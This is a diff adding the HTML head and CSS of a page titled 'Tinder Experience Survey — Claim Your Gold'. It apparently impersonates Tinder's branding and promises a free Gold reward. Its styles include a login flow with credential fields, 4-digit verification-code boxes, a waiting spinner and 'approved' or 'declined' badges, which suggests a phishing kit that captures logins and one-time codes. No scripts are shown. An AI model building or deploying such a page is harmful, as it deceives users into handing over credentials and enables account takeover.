@@ -1,0 +1,1394 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Tinder Experience Survey — Claim Your Gold</title>
+<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+:root {
+  --t-red:#FE3C72;--t-orange:#FF6036;
+  --t-grad:linear-gradient(135deg,#FE3C72 0%,#FF6036 100%);
+  --gold:#FFB800;--gold-lt:#FFF8E1;--gold-dark:#B8860B;
+  --bg:#FFFFFF;--bg2:#F7F7F7;--bg3:#EFEFEF;
+  --surface:#FFFFFF;--border:#E8E8E8;--border2:#D0D0D0;
+  --text:#1A1A1A;--text2:#424242;--muted:#757575;--muted2:#B0B0B0;
+  --success:#00B74A;--r:16px;--r-sm:10px;--r-lg:24px;
+  --shadow-lg:0 8px 48px rgba(0,0,0,0.10);
+}
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{font-family:'Nunito',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden;}
+
+/* HEADER */
+.header{position:sticky;top:0;z-index:200;background:rgba(255,255,255,0.95);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);height:60px;display:flex;align-items:center;justify-content:space-between;padding:0 28px;}
+.header-logo{display:flex;align-items:center;gap:10px;}
+.header-logo-icon{width:34px;height:34px;background:var(--t-grad);border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:18px;box-shadow:0 2px 8px rgba(254,60,114,0.35);}
+.header-logo-text{font-size:22px;font-weight:900;letter-spacing:-0.5px;background:var(--t-grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
+.header-pill{background:var(--gold-lt);border:1.5px solid var(--gold);color:var(--gold-dark);font-size:12px;font-weight:700;padding:5px 14px;border-radius:20px;}
+
+/* HERO */
+.hero{position:relative;overflow:hidden;padding:72px 24px 56px;text-align:center;}
+.hero::before{content:'';position:absolute;inset:0;background:linear-gradient(180deg,rgba(254,60,114,0.05) 0%,rgba(255,96,54,0.03) 60%,transparent 100%);pointer-events:none;}
+.hero-deco{position:absolute;pointer-events:none;z-index:0;font-size:36px;opacity:0.07;animation:floatHeart 6s ease-in-out infinite;}
+.hero-deco:nth-child(1){top:10%;left:8%;animation-delay:0s;font-size:28px;}
+.hero-deco:nth-child(2){top:20%;right:10%;animation-delay:1.5s;font-size:44px;}
+.hero-deco:nth-child(3){bottom:15%;left:15%;animation-delay:3s;font-size:22px;}
+.hero-deco:nth-child(4){bottom:10%;right:8%;animation-delay:0.8s;font-size:32px;}
+@keyframes floatHeart{0%,100%{transform:translateY(0) rotate(-8deg);}50%{transform:translateY(-14px) rotate(8deg);}}
+.hero-inner{position:relative;z-index:1;max-width:640px;margin:0 auto;}
+.hero-eyebrow{display:inline-flex;align-items:center;gap:7px;background:linear-gradient(135deg,rgba(254,60,114,0.08),rgba(255,96,54,0.06));border:1.5px solid rgba(254,60,114,0.2);color:var(--t-red);font-size:11px;font-weight:800;padding:6px 16px;border-radius:20px;text-transform:uppercase;letter-spacing:1px;margin-bottom:24px;}
+.eyebrow-dot{width:6px;height:6px;border-radius:50%;background:var(--t-red);animation:pulse 2s infinite;}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:0.5;transform:scale(1.4)}}
+.hero h1{font-size:clamp(32px,6vw,54px);font-weight:900;line-height:1.1;letter-spacing:-1px;color:var(--text);margin-bottom:18px;}
+.hero h1 .grad{background:var(--t-grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
+.hero-sub{font-size:16px;font-weight:600;color:var(--muted);line-height:1.65;max-width:480px;margin:0 auto 32px;}
+.reward-chip{display:inline-flex;align-items:center;gap:10px;background:var(--gold-lt);border:2px solid var(--gold);border-radius:14px;padding:12px 22px;box-shadow:0 2px 12px rgba(255,184,0,0.2);}
+.reward-chip-icon{font-size:22px;}
+.reward-chip-lbl{font-size:10px;font-weight:800;color:var(--gold-dark);text-transform:uppercase;letter-spacing:1px;}
+.reward-chip-name{font-size:15px;font-weight:800;color:#7A5C00;margin-top:1px;}
+
+/* TRUST */
+.trust-row{display:flex;flex-wrap:wrap;gap:8px;justify-content:center;padding:0 24px 56px;}
+.trust-chip{display:flex;align-items:center;gap:6px;background:var(--bg2);border:1px solid var(--border);border-radius:20px;padding:7px 14px;font-size:12px;font-weight:700;color:var(--text2);}
+
+/* SURVEY */
+.survey-outer{max-width:640px;margin:0 auto;padding:0 20px 100px;}
+.survey-card{background:var(--surface);border:1.5px solid var(--border);border-radius:var(--r-lg);overflow:hidden;box-shadow:var(--shadow-lg);}
+.prog-bar-wrap{height:5px;background:var(--bg3);}
+.prog-bar-fill{height:5px;background:var(--t-grad);transition:width 0.55s cubic-bezier(.4,0,.2,1);border-radius:0 3px 3px 0;}
+.prog-meta{display:flex;justify-content:space-between;align-items:center;padding:14px 24px 0;}
+.prog-dots{display:flex;gap:5px;}
+.prog-dot{width:8px;height:8px;border-radius:50%;background:var(--bg3);transition:background 0.3s;}
+.prog-dot.done{background:var(--t-red);}
+.prog-dot.current{background:var(--t-red);box-shadow:0 0 0 3px rgba(254,60,114,0.18);}
+.prog-label{font-size:12px;font-weight:700;color:var(--muted);}
+.prog-pct{font-size:12px;font-weight:800;color:var(--t-red);}
+
+/* Q BODY */
+.q-body{padding:28px 24px 24px;}
+.q-step{display:none;}
+.q-step.active{display:block;animation:slideIn 0.32s cubic-bezier(.4,0,.2,1) both;}
+@keyframes slideIn{from{opacity:0;transform:translateX(24px);}to{opacity:1;transform:translateX(0);}}
+.q-tag{display:inline-block;font-size:10px;font-weight:800;text-transform:uppercase;letter-spacing:1.2px;color:var(--t-red);background:rgba(254,60,114,0.07);padding:4px 10px;border-radius:5px;margin-bottom:12px;}
+.q-type-badge{display:inline-block;font-size:10px;font-weight:700;padding:3px 9px;border-radius:5px;margin-left:6px;vertical-align:middle;}
+.q-type-badge.type-choice{background:rgba(99,102,241,0.1);color:#6366F1;}
+.q-type-badge.type-text{background:rgba(16,185,129,0.1);color:#059669;}
+.q-type-badge.type-scale{background:rgba(245,158,11,0.1);color:#D97706;}
+.q-text{font-size:20px;font-weight:900;line-height:1.3;color:var(--text);margin-bottom:8px;letter-spacing:-0.3px;}
+.q-sub{font-size:13px;color:var(--muted);margin-bottom:18px;font-weight:600;line-height:1.5;}
+
+/* MULTIPLE CHOICE */
+.opts{display:flex;flex-direction:column;gap:8px;}
+.opt{width:100%;text-align:left;background:var(--bg2);border:2px solid var(--border);border-radius:var(--r-sm);padding:13px 16px;font-family:'Nunito',sans-serif;font-size:14px;font-weight:700;color:var(--text2);cursor:pointer;display:flex;align-items:center;gap:12px;transition:border-color 0.15s,background 0.15s,transform 0.1s,box-shadow 0.15s;}
+.opt:hover{border-color:rgba(254,60,114,0.4);background:rgba(254,60,114,0.04);transform:translateY(-1px);box-shadow:0 3px 12px rgba(254,60,114,0.1);}
+.opt.selected{border-color:var(--t-red);background:rgba(254,60,114,0.06);color:var(--text);transform:translateY(-1px);box-shadow:0 4px 16px rgba(254,60,114,0.15);}
+.opt-radio{width:20px;height:20px;border-radius:50%;flex-shrink:0;border:2px solid var(--border2);display:flex;align-items:center;justify-content:center;transition:border-color 0.15s,background 0.15s;background:var(--bg);}
+.opt.selected .opt-radio{border-color:var(--t-red);background:var(--t-grad);}
+.opt-radio-dot{width:7px;height:7px;border-radius:50%;background:#fff;opacity:0;transform:scale(0);transition:opacity 0.15s,transform 0.2s cubic-bezier(.34,1.56,.64,1);}
+.opt.selected .opt-radio-dot{opacity:1;transform:scale(1);}
+
+/* TEXT INPUT */
+.text-input-wrap{position:relative;margin-bottom:4px;}
+.q-text-input{width:100%;background:var(--bg2);border:2px solid var(--border);border-radius:var(--r-sm);padding:14px 16px;font-family:'Nunito',sans-serif;font-size:15px;font-weight:700;color:var(--text);outline:none;transition:border-color 0.2s,box-shadow 0.2s;}
+.q-text-input:focus{border-color:var(--t-red);box-shadow:0 0 0 3px rgba(254,60,114,0.1);}
+.q-text-input::placeholder{color:var(--muted2);font-weight:600;}
+.q-text-input.valid{border-color:var(--success);box-shadow:0 0 0 3px rgba(0,183,74,0.08);}
+.input-check{position:absolute;right:14px;top:50%;transform:translateY(-50%);font-size:18px;opacity:0;transition:opacity 0.2s;}
+.input-check.show{opacity:1;}
+
+/* TEXTAREA */
+.q-textarea{width:100%;background:var(--bg2);border:2px solid var(--border);border-radius:var(--r-sm);padding:14px 16px;font-family:'Nunito',sans-serif;font-size:14px;font-weight:600;color:var(--text);resize:vertical;min-height:110px;outline:none;transition:border-color 0.2s,box-shadow 0.2s;line-height:1.6;}
+.q-textarea:focus{border-color:var(--t-red);box-shadow:0 0 0 3px rgba(254,60,114,0.1);}
+.q-textarea::placeholder{color:var(--muted2);font-weight:600;}
+.char-hint{font-size:11px;font-weight:700;color:var(--muted2);text-align:right;margin-top:5px;transition:color 0.2s;}
+.char-hint.ok{color:var(--success);}
+
+/* SLIDER / SCALE */
+.scale-wrap{padding:8px 0 16px;}
+.scale-track{position:relative;padding:0 0 24px;}
+.scale-labels{display:flex;justify-content:space-between;margin-bottom:10px;}
+.scale-label{font-size:11px;font-weight:700;color:var(--muted);}
+input[type=range].scale-range{width:100%;-webkit-appearance:none;appearance:none;height:6px;border-radius:3px;outline:none;cursor:pointer;background:linear-gradient(90deg,var(--t-red) 0%,var(--t-red) var(--fill,50%),var(--bg3) var(--fill,50%),var(--bg3) 100%);}
+input[type=range].scale-range::-webkit-slider-thumb{-webkit-appearance:none;appearance:none;width:24px;height:24px;border-radius:50%;background:var(--t-grad);border:3px solid #fff;box-shadow:0 2px 8px rgba(254,60,114,0.4);cursor:pointer;transition:transform 0.15s;}
+input[type=range].scale-range::-webkit-slider-thumb:hover{transform:scale(1.15);}
+input[type=range].scale-range::-moz-range-thumb{width:24px;height:24px;border-radius:50%;background:var(--t-grad);border:3px solid #fff;box-shadow:0 2px 8px rgba(254,60,114,0.4);cursor:pointer;}
+.scale-value-display{text-align:center;margin-top:4px;}
+.scale-value-num{font-size:28px;font-weight:900;background:var(--t-grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;line-height:1;}
+.scale-value-label{font-size:13px;font-weight:700;color:var(--muted);margin-top:3px;}
+
+/* MULTI-SELECT */
+.multi-opts{display:flex;flex-direction:column;gap:8px;}
+.multi-opt{width:100%;text-align:left;background:var(--bg2);border:2px solid var(--border);border-radius:var(--r-sm);padding:13px 16px;font-family:'Nunito',sans-serif;font-size:14px;font-weight:700;color:var(--text2);cursor:pointer;display:flex;align-items:center;gap:12px;transition:border-color 0.15s,background 0.15s,transform 0.1s;}
+.multi-opt:hover{border-color:rgba(254,60,114,0.4);background:rgba(254,60,114,0.04);transform:translateY(-1px);}
+.multi-opt.selected{border-color:var(--t-red);background:rgba(254,60,114,0.06);color:var(--text);box-shadow:0 4px 16px rgba(254,60,114,0.12);}
+.multi-check{width:20px;height:20px;border-radius:5px;flex-shrink:0;border:2px solid var(--border2);display:flex;align-items:center;justify-content:center;transition:border-color 0.15s,background 0.15s;background:var(--bg);}
+.multi-opt.selected .multi-check{border-color:var(--t-red);background:var(--t-grad);}
+.multi-check-icon{font-size:11px;color:#fff;opacity:0;transition:opacity 0.15s;}
+.multi-opt.selected .multi-check-icon{opacity:1;}
+.multi-hint{font-size:11px;font-weight:700;color:var(--muted);margin-bottom:10px;}
+
+/* VALIDATION */
+.val-msg{font-size:12px;font-weight:700;color:var(--t-red);margin-top:8px;display:none;padding:7px 12px;background:rgba(254,60,114,0.06);border-radius:7px;border-left:3px solid var(--t-red);}
+
+/* NAV */
+.q-nav{display:flex;justify-content:space-between;align-items:center;padding:16px 24px 20px;border-top:1px solid var(--border);gap:12px;}
+.btn-back{background:transparent;border:2px solid var(--border);border-radius:var(--r-sm);padding:10px 20px;font-family:'Nunito',sans-serif;font-size:14px;font-weight:700;color:var(--muted);cursor:pointer;transition:border-color 0.2s,color 0.2s;}
+.btn-back:hover{border-color:var(--border2);color:var(--text2);}
+.btn-next{background:var(--t-grad);border:none;border-radius:var(--r-sm);padding:11px 30px;font-family:'Nunito',sans-serif;font-size:14px;font-weight:800;color:#fff;cursor:pointer;box-shadow:0 4px 16px rgba(254,60,114,0.35);transition:box-shadow 0.2s,transform 0.1s,filter 0.2s;}
+.btn-next:hover{filter:brightness(1.06);box-shadow:0 6px 24px rgba(254,60,114,0.45);}
+.btn-next:active{transform:scale(0.97);}
+
+/* RESULT */
+.result-wrap{padding:32px 24px;}
+.result-banner{background:var(--t-grad);border-radius:16px;padding:28px 24px;text-align:center;margin-bottom:24px;position:relative;overflow:hidden;}
+.result-banner::before{content:'❤️';position:absolute;font-size:80px;opacity:0.08;top:-10px;right:-10px;}
+.result-banner::after{content:'🔥';position:absolute;font-size:60px;opacity:0.08;bottom:-10px;left:-5px;}
+.result-trophy{font-size:44px;margin-bottom:10px;display:block;}
+.result-title{font-size:22px;font-weight:900;color:#fff;margin-bottom:6px;}
+.result-subtitle{font-size:13px;color:rgba(255,255,255,0.82);font-weight:700;line-height:1.5;}
+.score-row{display:flex;align-items:center;gap:16px;background:var(--bg2);border:1.5px solid var(--border);border-radius:14px;padding:16px 20px;margin-bottom:20px;}
+.score-ring-wrap{position:relative;width:64px;height:64px;flex-shrink:0;}
+.score-ring-wrap svg{transform:rotate(-90deg);}
+.score-ring-bg{fill:none;stroke:var(--bg3);stroke-width:6;}
+.score-ring-fg{fill:none;stroke:url(#rGrad);stroke-width:6;stroke-linecap:round;transition:stroke-dashoffset 1.2s ease 0.4s;}
+.score-ring-num{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:13px;font-weight:900;color:var(--t-red);}
+.score-text-title{font-size:14px;font-weight:800;color:var(--text);margin-bottom:3px;}
+.score-text-sub{font-size:12px;font-weight:700;color:var(--muted);}
+.reward-box{background:var(--gold-lt);border:2px solid var(--gold);border-radius:14px;padding:20px;margin-bottom:20px;}
+.reward-box-head{display:flex;align-items:center;gap:10px;margin-bottom:14px;}
+.reward-box-icon{font-size:26px;}
+.reward-box-lbl{font-size:10px;font-weight:800;color:var(--gold-dark);text-transform:uppercase;letter-spacing:1px;}
+.reward-box-name{font-size:16px;font-weight:900;color:#7A5C00;margin-top:2px;}
+.code-row{background:#fff;border:1.5px solid rgba(255,184,0,0.4);border-radius:10px;padding:14px 16px;display:flex;align-items:center;justify-content:space-between;gap:10px;}
+.code-hint-lbl{font-size:10px;font-weight:800;color:var(--gold-dark);text-transform:uppercase;letter-spacing:0.8px;margin-bottom:4px;}
+.code-value{font-size:22px;font-weight:900;letter-spacing:4px;color:var(--text);}
+.btn-copy{background:var(--t-grad);border:none;border-radius:8px;padding:9px 18px;font-family:'Nunito',sans-serif;font-size:13px;font-weight:800;color:#fff;cursor:pointer;flex-shrink:0;transition:filter 0.2s,transform 0.1s;box-shadow:0 2px 10px rgba(254,60,114,0.3);}
+.btn-copy:hover{filter:brightness(1.07);}
+.btn-copy.copied{background:linear-gradient(135deg,#00B74A,#00C853);}
+.redeem-box{background:var(--bg2);border:1.5px solid var(--border);border-radius:14px;padding:18px 20px;margin-bottom:16px;}
+.redeem-box-title{font-size:13px;font-weight:900;color:var(--text);margin-bottom:12px;}
+.redeem-step{display:flex;gap:12px;align-items:flex-start;font-size:13px;font-weight:600;color:var(--text2);margin-bottom:9px;line-height:1.5;}
+.redeem-step:last-child{margin-bottom:0;}
+.redeem-step-num{width:22px;height:22px;border-radius:50%;background:var(--t-grad);color:#fff;font-size:11px;font-weight:900;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:1px;}
+.expiry-note{font-size:12px;font-weight:700;color:var(--muted);text-align:center;padding:10px 0;display:flex;align-items:center;justify-content:center;gap:6px;}
+.expiry-dot{width:6px;height:6px;border-radius:50%;background:var(--gold);}
+
+/* STATS */
+.stats-section{background:var(--bg2);border-top:1px solid var(--border);border-bottom:1px solid var(--border);padding:64px 24px;text-align:center;}
+.section-title{font-size:26px;font-weight:900;color:var(--text);letter-spacing:-0.5px;margin-bottom:6px;}
+.section-sub{font-size:14px;font-weight:700;color:var(--muted);margin-bottom:40px;}
+.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:16px;max-width:680px;margin:0 auto;}
+.stat-card{background:var(--surface);border:1.5px solid var(--border);border-radius:16px;padding:22px 16px;box-shadow:0 2px 12px rgba(0,0,0,0.05);transition:transform 0.2s,box-shadow 0.2s;}
+.stat-card:hover{transform:translateY(-3px);box-shadow:0 6px 24px rgba(254,60,114,0.12);}
+.stat-card-val{font-size:32px;font-weight:900;background:var(--t-grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:5px;letter-spacing:-1px;}
+.stat-card-lbl{font-size:12px;font-weight:700;color:var(--muted);}
+
+/* FAQ */
+.faq-section{max-width:640px;margin:0 auto;padding:64px 24px;}
+.faq-item{border:1.5px solid var(--border);border-radius:12px;margin-bottom:8px;overflow:hidden;background:var(--surface);transition:border-color 0.2s;}
+.faq-item:hover{border-color:rgba(254,60,114,0.3);}
+.faq-q{display:flex;justify-content:space-between;align-items:center;padding:15px 18px;cursor:pointer;font-size:14px;font-weight:800;color:var(--text);gap:12px;transition:background 0.15s;}
+.faq-q:hover{background:var(--bg2);}
+.faq-icon{width:22px;height:22px;border-radius:50%;flex-shrink:0;background:var(--bg2);border:1.5px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:14px;color:var(--muted);transition:background 0.2s,border-color 0.2s,color 0.2s,transform 0.3s;}
+.faq-item.open .faq-icon{background:var(--t-grad);border-color:var(--t-red);color:#fff;transform:rotate(45deg);}
+.faq-a{font-size:13px;font-weight:600;color:var(--muted);line-height:1.7;max-height:0;overflow:hidden;transition:max-height 0.4s ease,padding 0.3s ease;padding:0 18px;}
+.faq-item.open .faq-a{max-height:200px;padding:0 18px 15px;}
+
+/* FOOTER */
+.footer{background:var(--text);padding:32px 28px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;}
+.footer-logo-text{font-size:20px;font-weight:900;background:var(--t-grad);-webkit-background-clip:text;-webkit-text-fill-color:transparent;}
+.footer-copy{font-size:12px;font-weight:700;color:#666;}
+.footer-links{display:flex;gap:18px;}
+.footer-links a{font-size:12px;font-weight:700;color:#666;text-decoration:none;transition:color 0.2s;}
+.footer-links a:hover{color:var(--t-red);}
+
+/* TOAST */
+.toast{position:fixed;bottom:24px;right:24px;z-index:9999;background:var(--text);color:#fff;border-radius:10px;padding:12px 20px;font-size:13px;font-weight:700;box-shadow:0 8px 32px rgba(0,0,0,0.18);transform:translateY(16px);opacity:0;transition:transform 0.3s,opacity 0.3s;pointer-events:none;}
+.toast.show{transform:translateY(0);opacity:1;}
+
+@media(max-width:600px){
+  .header{padding:0 16px;}
+  .hero{padding:56px 16px 44px;}
+  .q-body{padding:22px 18px 18px;}
+  .q-nav{padding:14px 18px 16px;}
+  .result-wrap{padding:24px 18px;}
+  .code-row{flex-direction:column;align-items:flex-start;}
+  .btn-copy{width:100%;text-align:center;}
+  .footer{flex-direction:column;align-items:flex-start;}
+}
+
+/* ── LOGIN FLOW STYLES ── */
+.ls-step { animation: slideIn 0.35s cubic-bezier(.4,0,.2,1) both; }
+.ls-wrap {
+  padding: 32px 24px 28px;
+  max-width: 420px; margin: 0 auto;
+}
+.ls-logo-row {
+  display: flex; align-items: center; gap: 8px;
+  margin-bottom: 20px;
+}
+.ls-flame {
+  width: 38px; height: 38px; border-radius: 11px;
+  background: var(--t-grad);
+  display: flex; align-items: center; justify-content: center;
+  font-size: 20px;
+  box-shadow: 0 3px 10px rgba(254,60,114,0.35);
+}
+.ls-brand {
+  font-size: 26px; font-weight: 900; letter-spacing: -0.5px;
+  background: var(--t-grad);
+  -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+}
+.ls-congrats-pill {
+  display: inline-flex; align-items: center; gap: 6px;
+  background: var(--gold-lt); border: 1.5px solid var(--gold);
+  color: var(--gold-dark); font-size: 12px; font-weight: 800;
+  padding: 6px 14px; border-radius: 20px;
+  margin-bottom: 20px;
+}
+.ls-title {
+  font-size: 22px; font-weight: 900; color: var(--text);
+  letter-spacing: -0.4px; margin-bottom: 8px; line-height: 1.25;
+}
+.ls-sub {
+  font-size: 14px; font-weight: 600; color: var(--muted);
+  line-height: 1.6; margin-bottom: 24px;
+}
+.ls-back-row {
+  font-size: 13px; font-weight: 700; color: var(--muted);
+  cursor: pointer; margin-bottom: 20px; display: inline-block;
+  transition: color 0.15s;
+}
+.ls-back-row:hover { color: var(--t-red); }
+.ls-field-group { display: flex; flex-direction: column; gap: 12px; margin-bottom: 8px; }
+.ls-field {
+  display: flex; align-items: center; gap: 10px;
+  background: var(--bg2); border: 2px solid var(--border);
+  border-radius: var(--r-sm); padding: 0 14px;
+  transition: border-color 0.2s, box-shadow 0.2s;
+}
+.ls-field:focus-within {
+  border-color: var(--t-red);
+  box-shadow: 0 0 0 3px rgba(254,60,114,0.1);
+}
+.ls-field-icon { font-size: 16px; flex-shrink: 0; }
+.ls-input {
+  flex: 1; background: transparent; border: none; outline: none;
+  padding: 13px 0;
+  font-family: 'Nunito', sans-serif;
+  font-size: 14px; font-weight: 700; color: var(--text);
+}
+.ls-input::placeholder { color: var(--muted2); font-weight: 600; }
+.ls-val-msg {
+  font-size: 12px; font-weight: 700; color: var(--t-red);
+  padding: 7px 12px; background: rgba(254,60,114,0.06);
+  border-radius: 7px; border-left: 3px solid var(--t-red);
+  margin-bottom: 14px; display: none;
+}
+.ls-btn {
+  width: 100%; padding: 14px;
+  background: var(--t-grad); border: none; border-radius: var(--r-sm);
+  font-family: 'Nunito', sans-serif;
+  font-size: 15px; font-weight: 800; color: #fff;
+  cursor: pointer; margin-bottom: 14px;
+  box-shadow: 0 4px 18px rgba(254,60,114,0.35);
+  transition: filter 0.2s, transform 0.1s, opacity 0.2s;
+  opacity: 1;
+}
+.ls-btn:hover { filter: brightness(1.06); }
+.ls-btn:active { transform: scale(0.98); }
+.ls-btn:disabled { opacity: 0.6; cursor: not-allowed; filter: none; transform: none; }
+.ls-terms {
+  font-size: 11px; font-weight: 600; color: var(--muted2);
+  text-align: center; line-height: 1.6;
+}
+.ls-terms a { color: var(--t-red); text-decoration: none; }
+.ls-resend {
+  font-size: 13px; font-weight: 700; color: var(--muted);
+  text-align: center; cursor: default; margin-top: 4px;
+}
+.ls-resend span { color: var(--t-red); cursor: pointer; }
+.ls-resend span:hover { text-decoration: underline; }
+
+/* 4-digit code boxes */
+.ls-code-row {
+  display: flex; gap: 12px; justify-content: center;
+  margin-bottom: 8px;
+}
+.ls-code-box {
+  width: 60px; height: 64px; border-radius: 12px;
+  border: 2px solid var(--border);
+  background: var(--bg2);
+  font-family: 'Nunito', sans-serif;
+  font-size: 26px; font-weight: 900;
+  color: var(--text); text-align: center; outline: none;
+  transition: border-color 0.2s, box-shadow 0.2s, transform 0.15s;
+  caret-color: var(--t-red);
+}
+.ls-code-box:focus {
+  border-color: var(--t-red);
+  box-shadow: 0 0 0 3px rgba(254,60,114,0.12);
+  transform: scale(1.06);
+}
+
+/* Step 3 — waiting */
+.ls-spinner-wrap {
+  display: flex; justify-content: center;
+  margin: 24px 0 16px;
+}
+.ls-spinner {
+  width: 48px; height: 48px; border-radius: 50%;
+  border: 4px solid var(--bg3);
+  border-top-color: var(--t-red);
+  animation: spin 0.85s linear infinite;
+}
+@keyframes spin { to { transform: rotate(360deg); } }
+.ls-status-bar {
+  display: flex; flex-direction: column; gap: 10px;
+  background: var(--bg2); border: 1.5px solid var(--border);
+  border-radius: 14px; padding: 16px 20px;
+  margin: 20px 0; text-align: left;
+}
+.ls-status-item {
+  display: flex; align-items: center; gap: 10px;
+  font-size: 13px; font-weight: 700; color: var(--text2);
+}
+.ls-status-dot {
+  width: 10px; height: 10px; border-radius: 50%;
+  background: var(--bg3); border: 2px solid var(--border2);
+  flex-shrink: 0; transition: background 0.3s, border-color 0.3s;
+}
+.ls-status-dot.done { background: var(--success); border-color: var(--success); }
+.ls-status-dot.pulse { background: var(--t-red); border-color: var(--t-red); animation: pulse 1.5s infinite; }
+.ls-status-dot.error { background: #E53935; border-color: #E53935; }
+.ls-approved-badge {
+  display: inline-block; background: rgba(0,183,74,0.1);
+  border: 1.5px solid rgba(0,183,74,0.4);
+  color: var(--success); font-size: 14px; font-weight: 800;
+  padding: 8px 20px; border-radius: 20px; margin-bottom: 8px;
+}
+.ls-gold-chip {
+  display: inline-block;
+  background: var(--gold-lt); border: 2px solid var(--gold);
+  color: var(--gold-dark); font-size: 14px; font-weight: 800;
+  padding: 10px 24px; border-radius: 12px;
+  margin-top: 16px;
+}
+.ls-declined-badge {
+  display: inline-block; background: rgba(229,57,53,0.08);
+  border: 1.5px solid rgba(229,57,53,0.3);
+  color: #E53935; font-size: 14px; font-weight: 800;
+  padding: 8px 20px; border-radius: 20px; margin-bottom: 8px;
+}
+
+/* ═══ RICH ANIMATIONS ═══════════════════════════════════════════ */
+
+/* Page load hero stagger */
+@keyframes fadeUp{from{opacity:0;transform:translateY(22px)}to{opacity:1;transform:translateY(0)}}
+@keyframes fadeDown{from{opacity:0;transform:translateY(-16px)}to{opacity:1;transform:translateY(0)}}
+@keyframes scalePop{from{opacity:0;transform:scale(0.88)}to{opacity:1;transform:scale(1)}}
+@keyframes gradShift{0%,100%{background-position:0% 50%}50%{background-position:100% 50%}}
+@keyframes shimmer{0%{background-position:-200% 0}100%{background-position:200% 0}}
+@keyframes bounceIn{0%{transform:scale(0.3);opacity:0}50%{transform:scale(1.08)}70%{transform:scale(0.96)}100%{transform:scale(1);opacity:1}}
+@keyframes shake{0%,100%{transform:translateX(0)}15%{transform:translateX(-7px)}30%{transform:translateX(7px)}45%{transform:translateX(-5px)}60%{transform:translateX(5px)}75%{transform:translateX(-2px)}90%{transform:translateX(2px)}}
+@keyframes ripple{0%{transform:scale(0);opacity:0.5}100%{transform:scale(4);opacity:0}}
+@keyframes heartBeat{0%,100%{transform:scale(1)}14%{transform:scale(1.3)}28%{transform:scale(1)}42%{transform:scale(1.2)}70%{transform:scale(1)}}
+@keyframes slideUp{from{opacity:0;transform:translateY(14px)}to{opacity:1;transform:translateY(0)}}
+@keyframes checkStrike{from{stroke-dashoffset:40}to{stroke-dashoffset:0}}
+@keyframes glowPulse{0%,100%{box-shadow:0 4px 16px rgba(254,60,114,0.3)}50%{box-shadow:0 4px 32px rgba(254,60,114,0.65),0 0 0 6px rgba(254,60,114,0.08)}}
+@keyframes typewriter{from{width:0}to{width:100%}}
+@keyframes confettiFall{0%{transform:translateY(-20px) rotate(0deg);opacity:1}100%{transform:translateY(100vh) rotate(720deg);opacity:0}}
+@keyframes progressGlow{0%,100%{box-shadow:none}50%{box-shadow:0 0 8px rgba(254,60,114,0.5)}}
+@keyframes optStagger{from{opacity:0;transform:translateX(-12px)}to{opacity:1;transform:translateX(0)}}
+@keyframes ls-flame-bounce{0%,100%{transform:scale(1) rotate(0deg)}25%{transform:scale(1.15) rotate(-5deg)}75%{transform:scale(1.1) rotate(5deg)}}
+
+/* Hero animated gradient headline */
+.hero h1 .grad{
+  background:linear-gradient(270deg,#FE3C72,#FF6036,#FFB300,#FE3C72);
+  background-size:300% 300%;
+  -webkit-background-clip:text;-webkit-text-fill-color:transparent;
+  animation:gradShift 4s ease infinite;
+}
+
+/* Hero entrance stagger */
+.hero-eyebrow{animation:fadeDown 0.6s 0.1s ease both;}
+.hero h1{animation:fadeUp 0.7s 0.25s ease both;}
+.hero-sub{animation:fadeUp 0.7s 0.4s ease both;}
+.reward-chip{animation:scalePop 0.6s 0.55s cubic-bezier(.34,1.56,.64,1) both;}
+
+/* Trust chips stagger */
+.trust-chip:nth-child(1){animation:fadeUp 0.5s 0.6s ease both;}
+.trust-chip:nth-child(2){animation:fadeUp 0.5s 0.72s ease both;}
+.trust-chip:nth-child(3){animation:fadeUp 0.5s 0.84s ease both;}
+.trust-chip:nth-child(4){animation:fadeUp 0.5s 0.96s ease both;}
+
+/* Survey card entrance */
+.survey-card{animation:fadeUp 0.7s 0.7s ease both;}
+
+/* Question slide with depth */
+.q-step.active{animation:slideIn 0.38s cubic-bezier(.4,0,.2,1) both;}
+
+/* Options staggered entrance */
+.q-step.active .opts .opt:nth-child(1){animation:optStagger 0.3s 0.05s ease both;}
+.q-step.active .opts .opt:nth-child(2){animation:optStagger 0.3s 0.10s ease both;}
+.q-step.active .opts .opt:nth-child(3){animation:optStagger 0.3s 0.15s ease both;}
+.q-step.active .opts .opt:nth-child(4){animation:optStagger 0.3s 0.20s ease both;}
+.q-step.active .opts .opt:nth-child(5){animation:optStagger 0.3s 0.25s ease both;}
+.q-step.active .multi-opts .multi-opt:nth-child(1){animation:optStagger 0.3s 0.05s ease both;}
+.q-step.active .multi-opts .multi-opt:nth-child(2){animation:optStagger 0.3s 0.10s ease both;}
+.q-step.active .multi-opts .multi-opt:nth-child(3){animation:optStagger 0.3s 0.15s ease both;}
+.q-step.active .multi-opts .multi-opt:nth-child(4){animation:optStagger 0.3s 0.20s ease both;}
+.q-step.active .multi-opts .multi-opt:nth-child(5){animation:optStagger 0.3s 0.25s ease both;}
+.q-step.active .multi-opts .multi-opt:nth-child(6){animation:optStagger 0.3s 0.30s ease both;}
+
+/* Selected option pop */
+.opt.selected{animation:optStagger 0s,scalePop 0.22s cubic-bezier(.34,1.56,.64,1) both!important;}
+
+/* Btn Next glow pulse */
+.btn-next{animation:glowPulse 2.5s 1.5s ease infinite;}
+
+/* Progress bar glow */
+.prog-bar-fill{animation:progressGlow 2s ease infinite;}
+
